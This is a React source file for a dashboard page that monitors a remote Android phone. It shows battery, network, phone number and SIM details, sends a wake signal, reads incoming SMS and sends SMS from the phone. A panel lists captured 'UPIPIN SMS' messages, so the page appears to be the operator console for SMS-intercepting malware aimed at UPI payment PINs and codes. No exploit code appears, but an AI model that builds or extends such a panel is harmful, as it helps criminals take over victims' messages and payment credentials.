import React, { useEffect, useRef, useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import {
  FiArrowLeft,
  FiBattery,
  FiCheckSquare,
  FiEdit3,
  FiMessageSquare,
  FiRefreshCw,
  FiSend,
  FiWifi
} from 'react-icons/fi'
import { toast } from 'react-hot-toast'
import SMSInbox from './SMSInbox'
import SendSMS from './SendSMS'

const API_BASE = import.meta.env.VITE_API_URL
const DEVICE_POLL_MS = 5000

function authHeaders(extra = {}) {
  return {
    Authorization: `Bearer ${localStorage.getItem('token') || ''}`,
    ...extra
  }
}

function displayName(device) {
  const model = device?.model || 'Unknown Android'
  const nickname = String(device?.nickname || '').trim()
  return nickname ? `${model} (${nickname})` : model
}

function getChecked(device) {
  return Boolean(device?.is_device_checked ?? device?.isdevicechecked ?? device?.isDeviceChecked ?? false)
}

function isDeviceOnline(device) {
  const explicit = device?.is_online ?? device?.online ?? device?.isOnline
  if (typeof explicit === 'boolean') return explicit

  const status = String(device?.status || device?.connection_status || '').toLowerCase()
  if (status === 'online') return true
  if (status === 'offline') return false

  const lastSeen = device?.last_seen ? new Date(device.last_seen).getTime() : 0
  return Number.isFinite(lastSeen) && lastSeen > 0 && Date.now() - lastSeen <= 30000
}

function indiaDateTime(value) {
  if (!value) return '—'
  const date = new Date(value)
  if (!Number.isFinite(date.getTime())) return '—'
  return new Intl.DateTimeFormat('en-IN', {
    timeZone: 'Asia/Kolkata',
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  }).format(date)
}

function valueOrDash(value) {
  const text = String(value ?? '').trim()
  return text || '—'
}

function simDisplay(value) {
  const text = String(value ?? '').trim()
  if (!text || /^n\/?a$/i.test(text)) return 'No SIM'
  if (/^unknown$/i.test(text)) return 'Unknown'
  return text
}

export default function DeviceDetail() {
  const navigate = useNavigate()
  const { deviceId } = useParams()

  const [device, setDevice] = useState(null)
  const [draft, setDraft] = useState({
    status_text: '',
    is_device_checked: false
  })
  const [activeTab, setActiveTab] = useState('info')
  const [loading, setLoading] = useState(true)
  const [saving, setSaving] = useState(false)
  const [wakeLoading, setWakeLoading] = useState(false)

  const mountedRef = useRef(false)
  const pollingRef = useRef(false)
  const dirtyRef = useRef(false)

  async function fetchDevice({ silent = false } = {}) {
    if (pollingRef.current) return
    pollingRef.current = true

    try {
      const response = await fetch(`${API_BASE}/devices/${encodeURIComponent(deviceId)}`, {
        headers: authHeaders()
      })

      const payload = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(payload.error || 'Device load failed')

      const nextDevice = payload.device || payload
      setDevice(nextDevice)

      if (!dirtyRef.current) {
        setDraft({
          status_text: nextDevice.status_text || '',
          is_device_checked: getChecked(nextDevice)
        })
      }
    } catch (error) {
      if (!silent) toast.error(`DEVICE LOAD FAILED: ${error.message}`)
    } finally {
      pollingRef.current = false
      setLoading(false)
    }
  }

  useEffect(() => {
    mountedRef.current = true
    dirtyRef.current = false
    setLoading(true)
    fetchDevice({ silent: false })

    const interval = setInterval(() => {
      if (!mountedRef.current || document.hidden) return
      fetchDevice({ silent: true })
    }, DEVICE_POLL_MS)

    return () => {
      mountedRef.current = false
      clearInterval(interval)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [deviceId])

  function updateDraft(patch) {
    dirtyRef.current = true
    setDraft((previous) => ({ ...previous, ...patch }))
  }

  async function saveDeviceFields(override = null, options = {}) {
    const nextDraft = { ...draft, ...(override || {}) }

    if (!options.silent) setSaving(true)
    try {
      const checked = Boolean(nextDraft.is_device_checked)

      const response = await fetch(`${API_BASE}/devices/${encodeURIComponent(deviceId)}`, {
        method: 'PATCH',
        headers: authHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify({
          status_text: nextDraft.status_text,
          is_device_checked: checked,
          isdevicechecked: checked,
          isDeviceChecked: checked
        })
      })

      const payload = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(payload.error || 'Save failed')

      dirtyRef.current = false
      const savedDevice = payload.device || { ...device, ...nextDraft, is_device_checked: checked }
      setDevice(savedDevice)
      setDraft({
        status_text: savedDevice.status_text || nextDraft.status_text || '',
        is_device_checked: getChecked(savedDevice) || checked
      })

      if (!options.silent) toast.success('DEVICE STATUS UPDATED')
    } catch (error) {
      toast.error(`SAVE FAILED: ${error.message}`)
      throw error
    } finally {
      if (!options.silent) setSaving(false)
    }
  }

  async function handleCheckedChange(checked) {
    updateDraft({ is_device_checked: checked })
    setDevice((previous) => previous ? { ...previous, is_device_checked: checked } : previous)

    try {
      await saveDeviceFields({ is_device_checked: checked }, { silent: true })
      toast.success(`DEVICE CHECKED: ${checked ? 'TRUE' : 'FALSE'}`)
    } catch {
      setDevice((previous) => previous ? { ...previous, is_device_checked: !checked } : previous)
      setDraft((previous) => ({ ...previous, is_device_checked: !checked }))
    }
  }

  async function wakeDevice() {
    setWakeLoading(true)
    try {
      const response = await fetch(`${API_BASE}/devices/${encodeURIComponent(deviceId)}/wake`, {
        method: 'POST',
        headers: authHeaders()
      })

      const payload = await response.json().catch(() => ({}))
      if (!response.ok) throw new Error(payload.error || 'Wake failed')

      if (payload.sent === false || payload.via === 'already_online') {
        toast(`DEVICE ALREADY ONLINE — WAKE NOT SENT`, {
          icon: '🟢'
        })
        await fetchDevice({ silent: true })
        return
      }

      toast.success('WAKE SIGNAL SENT')
    } catch (error) {
      toast.error(`WAKE FAILED: ${error.message}`)
    } finally {
      setWakeLoading(false)
    }
  }

  if (loading && !device) {
    return (
      <main className="cyber-bg min-h-screen p-6 text-slate-100">
        <div className="cyber-card mx-auto max-w-6xl p-8 text-center text-emerald-200">
          LOADING DEVICE NODE…
        </div>
      </main>
    )
  }

  if (!device) {
    return (
      <main className="cyber-bg min-h-screen p-6 text-slate-100">
        <div className="cyber-card mx-auto max-w-6xl p-8 text-center">
          <p className="mb-4 text-red-300">DEVICE NOT FOUND</p>
          <button type="button" onClick={() => navigate(-1)} className="primary-btn">GO BACK</button>
        </div>
      </main>
    )
  }

  const checked = getChecked(device)
  const online = isDeviceOnline(device)
  const batteryValue = device.battery_percent ?? device.battery

  return (
    <main className="cyber-bg min-h-screen p-4 text-slate-100 md:p-6">
      <div className="mx-auto max-w-7xl space-y-4">
        <header className="cyber-card flex flex-col gap-4 p-4 md:flex-row md:items-center md:justify-between">
          <div className="min-w-0">
            <button
              type="button"
              onClick={() => navigate(-1)}
              className="mb-3 inline-flex items-center gap-2 rounded-xl border border-emerald-500/30 px-3 py-2 text-sm text-emerald-200 hover:bg-emerald-500/10"
            >
              <FiArrowLeft /> BACK
            </button>

            <h1 className="flex min-w-0 items-center gap-3 text-2xl font-black text-emerald-300">
              <span className="truncate">#{device.device_sequence || device.sequence || '?'} {displayName(device)}</span>
              <span
                title={online ? 'Online' : 'Offline'}
                className={`h-3.5 w-3.5 shrink-0 rounded-full shadow-lg ${online ? 'bg-emerald-400 shadow-emerald-400/60' : 'bg-red-500 shadow-red-500/60'}`}
              />
            </h1>
            <p className="mt-1 text-xs text-slate-400">Device ID: {device.device_uid || deviceId}</p>
          </div>

          <button
            type="button"
            onClick={wakeDevice}
            disabled={wakeLoading}
            className="rounded-xl border border-emerald-500/40 px-4 py-2 text-sm font-bold text-emerald-200 hover:bg-emerald-500/10 disabled:opacity-60"
          >
            <FiRefreshCw className="mr-2 inline" />
            {wakeLoading ? 'WAKING…' : 'WAKE DEVICE'}
          </button>
        </header>

        <section className="grid gap-3 md:grid-cols-4">
          <div className="cyber-card p-4">
            <div className="mb-1 flex items-center gap-2 text-xs text-slate-400"><FiBattery /> Battery</div>
            <div className="text-lg font-black text-emerald-200">
              {valueOrDash(batteryValue)}
              {String(batteryValue || '').match(/%/) ? '' : '%'}
            </div>
            <div className="text-xs text-slate-400">{device.charging ? 'Charging' : 'Not charging'}</div>
          </div>

          <div className="cyber-card p-4">
            <div className="mb-1 flex items-center gap-2 text-xs text-slate-400"><FiWifi /> Network</div>
            <div className="text-lg font-black text-emerald-200">{valueOrDash(device.network || device.network_type)}</div>
            <div className="text-xs text-slate-400">Android {valueOrDash(device.android_version)}</div>
          </div>

          <div className="cyber-card p-4">
            <div className="mb-1 text-xs text-slate-400">Phone</div>
            <div className="text-lg font-black text-emerald-200">{valueOrDash(device.phone_number)}</div>
            <div className="text-xs text-slate-400">SIM1: {simDisplay(device.phone_sim1)} | SIM2: {simDisplay(device.phone_sim2)}</div>
          </div>

          <div className="cyber-card p-4">
            <div className="mb-1 flex items-center gap-2 text-xs text-slate-400"><FiCheckSquare /> Checked</div>
            <div className={checked ? 'text-lg font-black text-emerald-300' : 'text-lg font-black text-red-300'}>
              {checked ? 'true' : 'false'}
            </div>
            <div className="text-xs text-slate-400">Last seen: {indiaDateTime(device.last_seen)}</div>
            <div className="text-xs text-slate-500">Created: {indiaDateTime(device.created_at)}</div>
          </div>
        </section>

        <nav className="cyber-card flex flex-wrap gap-2 p-2">
          {[
            ['info', <FiEdit3 key="i" />, 'Device info'],
            ['sms', <FiMessageSquare key="s" />, 'Incoming SMS'],
            ['send', <FiSend key="x" />, 'Send SMS']
          ].map(([key, icon, label]) => (
            <button
              key={key}
              type="button"
              onClick={() => setActiveTab(key)}
              className={`rounded-xl px-4 py-2 text-sm font-bold transition ${
                activeTab === key
                  ? 'bg-emerald-500 text-black'
                  : 'border border-emerald-500/30 text-emerald-200 hover:bg-emerald-500/10'
              }`}
            >
              <span className="mr-2 inline-flex align-middle">{icon}</span>
              {label}
            </button>
          ))}
        </nav>

        {activeTab === 'info' && (
          <section className="grid gap-4 lg:grid-cols-2">
            <div className="cyber-card p-4">
              <h2 className="mb-4 text-lg font-black text-emerald-300">DEVICE STATUS EDITOR</h2>

              <div className="mb-4 rounded-xl border border-emerald-500/20 bg-black/30 p-3">
                <div className="mb-2 text-xs font-bold uppercase tracking-wider text-slate-400">Current status text</div>
                <p className="whitespace-pre-wrap break-words text-sm text-slate-200">
                  {valueOrDash(device.status_text)}
                </p>
              </div>

              <div className="mb-4 rounded-xl border border-emerald-500/20 bg-black/30 p-3">
                <div className="mb-2 text-xs font-bold uppercase tracking-wider text-slate-400">Device created</div>
                <p className="text-sm font-bold text-emerald-200">{indiaDateTime(device.created_at)}</p>
              </div>

              <label className="mb-4 block">
                <span className="mb-2 block text-xs font-bold uppercase tracking-wider text-slate-400">Status text</span>
                <textarea
                  value={draft.status_text}
                  onChange={(event) => updateDraft({ status_text: event.target.value })}
                  rows={5}
                  className="w-full rounded-xl border border-emerald-500/30 bg-black/40 p-3 text-sm text-slate-100 outline-none focus:border-emerald-400"
                  placeholder="Write internal status for this device..."
                />
              </label>

              <label className="mb-4 flex items-center gap-3 rounded-xl border border-emerald-500/20 bg-black/30 p-3">
                <input
                  type="checkbox"
                  checked={!!draft.is_device_checked}
                  onChange={(event) => handleCheckedChange(event.target.checked)}
                  className="h-5 w-5 accent-emerald-400"
                />
                <span className="text-sm font-bold text-slate-200">isdevicechecked</span>
              </label>

              <button
                type="button"
                onClick={() => saveDeviceFields()}
                disabled={saving}
                className="rounded-xl bg-emerald-400 px-5 py-2 text-sm font-black text-black hover:bg-emerald-300 disabled:opacity-60"
              >
                {saving ? 'UPDATING…' : 'UPDATE DEVICE'}
              </button>
            </div>

            <div className="cyber-card p-4">
              <h2 className="mb-4 text-lg font-black text-emerald-300">UPIPIN SMS</h2>
              {device.upipin_messages?.length ? (
                <div className="space-y-3">
                  {device.upipin_messages.map((message) => (
                    <div key={message.id || `${message.timestamp}-${message.body}`} className="rounded-xl border border-emerald-500/20 bg-black/30 p-3">
                      <div className="mb-1 text-xs text-slate-400">{indiaDateTime(message.timestamp || message.created_at)}</div>
                      <p className="text-sm text-slate-200">{message.body}</p>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="rounded-xl border border-emerald-500/20 p-8 text-center text-sm text-slate-400">
                  NO UPIPIN SMS FOUND
                </div>
              )}
            </div>
          </section>
        )}

        {activeTab === 'sms' && <SMSInbox deviceId={deviceId} />}
        {activeTab === 'send' && (
          <SendSMS
            deviceId={deviceId}
            device={device}
            onSentSuccess={() => setActiveTab('sms')}
          />
        )}
      </div>
    </main>
  )
}
